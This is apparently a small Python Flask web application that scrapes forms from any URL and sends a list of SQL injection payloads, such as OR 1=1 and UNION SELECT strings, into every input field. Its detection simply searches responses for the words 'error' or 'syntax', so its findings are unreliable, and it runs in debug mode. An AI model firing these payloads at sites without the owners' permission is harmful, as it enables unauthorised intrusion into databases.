from flask import Flask, request, jsonify, render_template
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

# SQL injection payloads
sql_payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR ''='",
    "' OR 1=1 LIMIT 1 --",
    "' OR SLEEP(5) --",
    "' UNION SELECT NULL, NULL --"
]

def find_input_fields(html):
    """
    Find all input fields from the HTML and their corresponding forms.
    """
    soup = BeautifulSoup(html, 'html.parser')
    forms = soup.find_all('form')
    fields = []

    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        for input_field in inputs:
            name = input_field.get('name')
            if name:
                fields.append({'name': name, 'action': action, 'method': method})
    
    return fields

@app.route('/')
def home():
    return render_template('scanner.html')

@app.route('/scan_sql', methods=['POST'])
def scan_sql():
    data = request.get_json()
    target_url = data.get('url')

    if not target_url or not target_url.startswith(('http://', 'https://')):
        return jsonify({"error": "Invalid URL provided."})

    try:
        # Send initial GET request to get the form and input fields
        response = requests.get(target_url, timeout=10)
        input_fields = find_input_fields(response.text)

        vulnerabilities = []
        for input_field in input_fields:
            action = input_field['action']
            method = input_field['method']
            name = input_field['name']

            # Test SQL injection for each payload
            for payload in sql_payloads:
                if method == 'get':
                    params = {name: payload}
                    test_url = f"{target_url.rstrip('/')}/{action.lstrip('/')}"
                    response = requests.get(test_url, params=params, timeout=10)
                else:  # POST request
                    data = {name: payload}
                    test_url = f"{target_url.rstrip('/')}/{action.lstrip('/')}"
                    response = requests.post(test_url, data=data, timeout=10)

                # Detect SQL vulnerability based on response
                if "error" in response.text.lower() or "syntax" in response.text.lower():
                    vulnerabilities.append(f"Field '{name}' with payload '{payload}'.")

        if vulnerabilities:
            return jsonify({"vulnerable": True, "vulnerabilities": vulnerabilities})
        else:
            return jsonify({"vulnerable": False, "vulnerabilities": []})

    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Request failed: {str(e)}"})

if __name__ == '__main__':
    app.run(debug=True,port=5004)
